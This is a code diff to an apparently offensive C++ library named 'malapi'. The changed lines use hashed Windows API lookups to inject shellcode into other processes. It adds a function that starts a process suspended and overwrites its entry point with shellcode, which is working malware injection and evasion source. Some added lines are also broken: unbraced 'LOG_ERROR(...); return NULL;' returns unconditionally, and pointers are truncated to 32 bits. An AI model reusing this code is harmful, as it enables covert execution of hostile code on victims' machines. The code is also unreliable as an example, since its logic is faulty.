@@ -193,19 +193,19 @@ namespace malapi
 		typeWriteProcessMemory WriteProcessMemoryC = NULL;
 		typeGetLastError GetLastErrorC = NULL;
 
-		constexpr ULONG hash_virtualallocexnuma = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
-		constexpr ULONG hash_virtualprotectex = malapi::HashStringFowlerNollVoVariant1a("VirtualProtectEx");
-		constexpr ULONG hash_writeprocessmemory = malapi::HashStringFowlerNollVoVariant1a("WriteProcessMemory");
-		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_virtualallocexnuma = HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
+		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
+		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
 
-		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
+		kernel32 = GetModuleHandleC(hash_kernel32);
 		if (kernel32 == NULL) return NULL;
 
-		VirtualAllocExNumaC = (typeVirtualAllocExNuma)malapi::GetProcAddressC(kernel32, hash_virtualallocexnuma);
-		VirtualProtectExC = (typeVirtualProtectEx)malapi::GetProcAddressC(kernel32, hash_virtualprotectex);
-		WriteProcessMemoryC = (typeWriteProcessMemory)malapi::GetProcAddressC(kernel32, hash_writeprocessmemory);
-		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
+		VirtualAllocExNumaC = (typeVirtualAllocExNuma)GetProcAddressC(kernel32, hash_virtualallocexnuma);
+		VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
+		WriteProcessMemoryC = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
+		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
 
 		address_ptr = VirtualAllocExNumaC(process_handle, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, 0);
 		if (address_ptr == NULL)
@@ -690,9 +690,6 @@ namespace malapi
 	{
 		STARTUPINFOA si = {};
 		PROCESS_INFORMATION pi = {};
-		//PDWORD process_id;
-		//PHANDLE process_handle;
-		//PHANDLE thread_handle;
 
 #pragma region winapi_imports
 
@@ -721,6 +718,79 @@ namespace malapi
 
 		CloseHandleC(pi.hThread);
 		return pi.hProcess;
+	}
+
+	//
+	// CreateSuspendedProcess
+	// Return Handle to Thread
+	//
+	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
+	{
+		STARTUPINFOA si = {};
+		PROCESS_INFORMATION pi = {};
+		PROCESS_BASIC_INFORMATION pbi = {};
+		DWORD ret_length = 0;
+		DWORD peb_offset = 0;
+		LPVOID image_base = 0;
+		LPVOID code_entry = 0;
+		BYTE headers_buffer[4096] = {};
+
+#pragma region winapi_imports
+
+		typeCreateProcessA CreateProcessC = NULL;
+		typeCloseHandle CloseHandleC = NULL;
+		typeNtQueryInformationProcess NtQueryInformationProcessC = NULL;
+		typeGetLastError GetLastErrorC = NULL;
+		typeWriteProcessMemory WriteProcessMemoryC = NULL;
+		typeReadProcessMemory ReadProcessMemoryC = NULL;
+
+		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("NTDLL.DLL");
+		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
+		constexpr DWORD hash_closehandle = HashStringFowlerNollVoVariant1a("CloseHandle");
+		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
+		constexpr DWORD hash_readprocessmemory = HashStringFowlerNollVoVariant1a("ReadProcessMemory");
+		constexpr DWORD hash_ntqueryinformationprocess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");
+		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
+		if (kernel32 == NULL || ntdll == NULL) return NULL;
+
+		CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
+		CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
+		WriteProcessMemoryC = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
+		ReadProcessMemoryC = (typeReadProcessMemory)GetProcAddressC(kernel32, hash_readprocessmemory);
+		NtQueryInformationProcessC = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_ntqueryinformationprocess);
+		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+
+#pragma endregion
+
+		RtlZeroMemory(&si, sizeof(STARTUPINFOA));
+		RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+		RtlZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
+
+		si.cb = sizeof(STARTUPINFOA);
+
+		if (!CreateProcessC(0, file_path, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
+		{
+			LOG_ERROR("Failed to Create Process. (Code: %016llX)", GetLastErrorC());
+		}
+
+		NtQueryInformationProcessC(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ret_length);
+		peb_offset = (DWORD)pbi.PebBaseAddress + 8;
+
+		if (!ReadProcessMemoryC(pi.hProcess, (LPVOID)peb_offset, &image_base, 4, NULL)) LOG_ERROR("Failed to get Target Process' Image Base Address. (Code: %016llX)", GetLastErrorC()); return NULL;
+		LOG_SUCCESS("Image Base Address: %016llX", image_base);
+		if (!ReadProcessMemoryC(pi.hProcess, (LPVOID)image_base, headers_buffer, 4096, NULL)) LOG_ERROR("Failed to Target Process' Image Headers. (Code: %016llX)", GetLastErrorC()); return NULL;
+
+		PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)headers_buffer;
+		PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((PDWORD)headers_buffer + dos_header->e_lfanew);
+		code_entry = (LPVOID)(nt_headers->OptionalHeader.AddressOfEntryPoint + (DWORD)image_base);
+
+		if (!WriteProcessMemoryC(pi.hProcess, code_entry, shellcode, shellcode_size, NULL)) LOG_ERROR("Failed to write shellcode to entry point"); return NULL;
+		LOG_SUCCESS("Shellcode written to: %016llX", code_entry);
+		return pi.hThread;
 	}
 
 	//
